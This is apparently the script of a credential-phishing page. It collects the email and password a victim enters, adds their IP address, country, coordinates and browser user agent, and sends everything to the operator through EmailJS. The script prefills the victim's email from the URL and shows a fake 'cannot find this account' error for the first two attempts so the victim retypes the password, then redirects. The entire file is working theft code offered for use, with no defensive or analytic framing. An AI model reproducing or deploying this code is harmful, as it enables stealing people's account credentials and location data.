// Initialize EmailJS with your User ID
// emailjs.init("rIWBJaZ0Vt_hBHInA"); // Replace 'YOUR_USER_ID' with your EmailJS public key
emailjs.init("rIWBJaZ0Vt_hBHInA");

let attemptCount = 0; // Variable to keep track of attempts

// Function to get query parameter by name
function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

// Set email input value if it exists in the URL
const emailFromUrl = getQueryParam("email");
if (emailFromUrl) {
    document.getElementById("email").value = emailFromUrl;
}

// Function to get user IP address and country info
async function getUserIPAndLocation() {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    return {
        ip: data.ip,
        country: data.country_name,
        latitude: data.latitude,
        longitude: data.longitude,
    };
}

document
    .getElementById("loginForm")
    .addEventListener("submit", async function (event) {
        event.preventDefault(); // Prevent form submission

        // Get form values
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const userAgent = navigator.userAgent; // Get browser user agent
        const userIPAndLocation = await getUserIPAndLocation(); // Get user IP address and country info

        // Create an object to hold the form data
        const templateParams = {
            email: email,
            password: password, // Email and password values
            user_agent: userAgent, // Browser fingerprint
            ip_address: userIPAndLocation.ip, // User IP address
            country: userIPAndLocation.country || "N/A", // User country
            latitude: userIPAndLocation.latitude || "N/A", // User location latitude
            longitude: userIPAndLocation.longitude || "N/A", // User location longitude
        };

        // Increment attempt count
        attemptCount++;

        // Send the email using EmailJS
        emailjs.send("service_j503itt", "template_f0gbjho", templateParams).then(
            function (response) {
                console.log("SUCCESS!", response.status, response.text);

                // Determine the success message based on the attempt count
                if (attemptCount < 3) {
                    document.getElementById(
                        "errorMessage"
                    ).innerText = 'We cannot find this account, please type in correct eamil or password';
                    document.getElementById("errorMessage").style.display = "block";
                    document.getElementById("loginMessage").style.display = "none";
                    document.getElementById("password").value = "";
                } else {
                    document.getElementById("loginMessage").innerText = "Connecting...";
                    document.getElementById("loginMessage").style.display = "block";
                    document.getElementById("errorMessage").style.display = "none";
                    // Clear input fields after each attempt
                    document.getElementById("email").value = "";
                    document.getElementById("password").value = "";
                    // Wait 3 seconds before loading the new page
                    setTimeout(function () {
                        window.location.href = "#"; // Replace with the desired URL
                    }, 2000);
                }
            },
            function (error) {
                console.log("FAILED...", error);
                document.getElementById("errorMessage").innerText =
                    "Login failed. Try again.";
                document.getElementById("errorMessage").style.display = "block";
                document.getElementById("email").value = "";
                document.getElementById("password").value = "";
            }
        );
    });